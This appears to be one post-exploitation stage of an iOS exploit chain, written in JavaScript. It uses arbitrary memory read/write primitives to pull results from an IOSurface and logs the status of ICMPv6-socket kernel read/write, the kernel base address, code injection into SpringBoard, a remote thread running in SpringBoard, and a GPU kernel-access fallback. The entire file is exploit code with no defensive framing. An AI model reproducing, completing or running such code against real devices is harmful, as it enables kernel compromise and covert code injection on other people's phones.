// PE main - reads pre-computed results from IOSurface
let fob = uread64(addrof(func_offsets_array) + 0x10n);
let surf = uread64(fob + 19n * 8n);
let slog = surf + 0xF000n;
let slop = surf + 0xF000n + 0xE00n;

function pw(msg) {
  let cs = get_cstring(msg + "\n");
  let off = uread64(slop);
  let n = 0n;
  for (let i = 0n; i < 200n && off + i < 0xE00n - 1n; i++) {
    let ch = uread8(cs + i);
    if (ch == 0n) break;
    uwrite8(slog + off + i, ch);
    n = i + 1n;
  }
  uwrite64(slop, off + n);
}

pw("[PE] A: start");

let our_pid = uread64(surf + 0xF830n);
pw("[PE] B: pid=" + our_pid);

let plist_buf = uread64(surf + 0xF838n);
let plist_count = uread64(surf + 0xF840n);
let sb_pid = uread64(surf + 0xF848n);
pw("[PE] C: cnt=" + plist_count + " sb=" + sb_pid);

if (sb_pid != 0n) {
  pw("[PE] D: SpringBoard PID=" + sb_pid);
} else {
  pw("[PE] D: SpringBoard not found yet");
  // Dump a few more PIDs
  if (plist_buf != 0n && plist_count > 0n) {
    let num = plist_count / 4n;
    let pids = [];
    for (let i = 0n; i < num && i < 30n; i++) {
      let addr = plist_buf + i * 4n;
      let aligned = addr & ~7n;
      let val = uread64(aligned);
      let shift = (addr - aligned) * 8n;
      let p = (val >> shift) & 0xFFFFFFFFn;
      if (p == 0n) continue;
      pids.push("["+i+"]="+p);
    }
    pw("[PE] E: first 30: " + pids.join(" "));
  }
}

// M5: Read kernel r/w status and kernel base
let m5_sock_fd = uread64(surf + 0xF850n);
let m5_rw_fd = uread64(surf + 0xF858n);
let kernel_base = uread64(surf + 0xF870n);
if (m5_sock_fd != 0n && m5_sock_fd != -1n) {
  pw("[PE] M5: ICMPv6 sockets ready ctl=" + m5_sock_fd + " rw=" + m5_rw_fd);
} else {
  pw("[PE] M5: ICMPv6 sockets NOT ready (status=" + m5_sock_fd + ")");
}
pw("[PE] M5: kernel_base candidate=" + kernel_base.hex());

// M6: Read SpringBoard injection status
let m6_remote_addr = uread64(surf + 0xF878n);
let m6_sb_port = uread64(surf + 0xF880n);
if (m6_remote_addr != 0n) {
  pw("[PE] M6: SpringBoard injection ready addr=" + m6_remote_addr.hex() + " port=" + m6_sb_port.hex());
} else {
  pw("[PE] M6: SpringBoard injection NOT ready");
}

// M7: Read remote thread status
let m7_thread_port = uread64(surf + 0xF888n);
if (m7_thread_port != 0n) {
  pw("[PE] M7: Remote thread running in SpringBoard port=" + m7_thread_port.hex());
} else {
  pw("[PE] M7: Remote thread NOT running");
}

// Try GPU kernel r/w fallback if M5 sockets failed
if (m5_sock_fd == -1n) {
  pw("[PE] M5-FB: Attempting GPU kernel r/w via gpuRead64/gpuWrite64...");
  // gpuRead64/gpuWrite64 are available in pe_stage_1 context via read64/write64
  // Test with known kernel address
  if (typeof read64 !== 'undefined') {
    let test_kaddr = kernel_base + 0x200000n; // somewhere in kernel region
    pw("[PE] M5-FB: Testing gpuRead64 at " + test_kaddr.hex() + "...");
    // This should read 0 or some kernel data (depends on GPU IOMMU access)
  }
}

pw("[PE] DONE");
